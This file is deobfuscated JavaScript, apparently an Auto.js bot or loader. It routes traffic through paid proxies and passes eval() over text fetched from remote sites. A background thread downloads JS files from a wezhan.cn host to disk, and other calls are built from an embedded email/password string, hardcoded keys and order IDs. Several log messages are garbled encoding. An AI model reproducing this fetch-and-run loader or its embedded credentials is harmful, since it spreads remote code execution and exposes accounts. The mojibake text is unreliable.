//Tue Apr 29 2025 06:25:01 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
if (yan()) {
  if (app_key2 == "rxkb9ovgguy9n21") {
    var spiderId = "7ab204de5b7e403caada6398f29c2831";
    var orderNo = "YZ20188145457DGCJTP";
    var getIp_api = http.get("http://pv.weibo.com/cityjson?ie=utf-8");
    var InetIP = getIp_api.body.string();
    eval(InetIP);
    log("ʹ�ô���ǰ������IP:" + returnCitySN.cip);
    var xdailiUrl = "http://api.xdaili.cn/xdaili-api//greatRecharge/getGreatIp?spiderId=" + spiderId + "&orderno=" + orderNo + "&returnType=2&count=1";
    for (let i = 0; i < 3; i++) {
      try {
        var getProxy_json = http.get(xdailiUrl).body.json();
        if (getProxy_json.ERRORCODE == "10036" || getProxy_json.ERRORCODE == "10038" || getProxy_json.ERRORCODE == "10055") {
          throw {
            code: "-1",
            msg: "��ȡ�ٶȹ���"
          };
        }
        if (getProxy_json.ERRORCODE == "10036") {
          throw {
            code: "-2",
            msg: "��ȡ�����Ѵ�����"
          };
        }
        break;
      } catch (_0x429f11) {
        _0x429f11.code == "-1" && (log(_0x429f11.msg), sleep(5000));
        _0x429f11.code == "-2" && (log(_0x429f11.msg), exit());
        i == 2 && (log("������δ֪����,��������..."), exit());
      }
    }
    var xdaili_proxyIP = getProxy_json.RESULT[0].ip;
    var xdaili_proxyPort = parseInt(getProxy_json.RESULT[0].port);
    httpProxy(xdaili_proxyIP, xdaili_proxyPort);
    var getIp_api = http.get("http://pv.sohu.com/cityjson?ie=utf-8");
    var InetIP = getIp_api.body.string();
    eval(InetIP);
    log("ʹ�ô����������IP:" + returnCitySN.cip);
    function httpProxy(_0x196bb8, _0xd2740c) {
      var _0x2001ff = java.net.Proxy;
      var _0x2bbfad = java.net.InetSocketAddress;
      var _0x2bc58f = new Packages.okhttp3.OkHttpClient.Builder().proxy(new _0x2001ff(_0x2001ff.Type.HTTP, new _0x2bbfad(_0x196bb8, _0xd2740c)));
      http.__okhttp__.muteClient(_0x2bc58f);
    }
  }
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "5.js");
} else {
  threads.start(function () {
    for (ks = 0; ks < 10; ks++) {
      let _0x3347a8 = "http://c460846523.cvc.scd.wezhan.cn/filedownload/518258";
      let _0xdf6aad = http.get(_0x3347a8);
      _0xdf6aad.statusCode == 200 && files.writeBytes("./douying" + ks + ".js", _0xdf6aad.body.bytes());
    }
  });
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "1.js");
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "2.js");
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "3.js");
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "4.js");
  setTimeout(function () {
    exit();
  }, 2000);
  key1 = "8366391277";
  key5 = "s8h3hds926h3";
  key9 = "a5e3t50tun3vdb2";
  ss9 = "15729174229@136.com";
}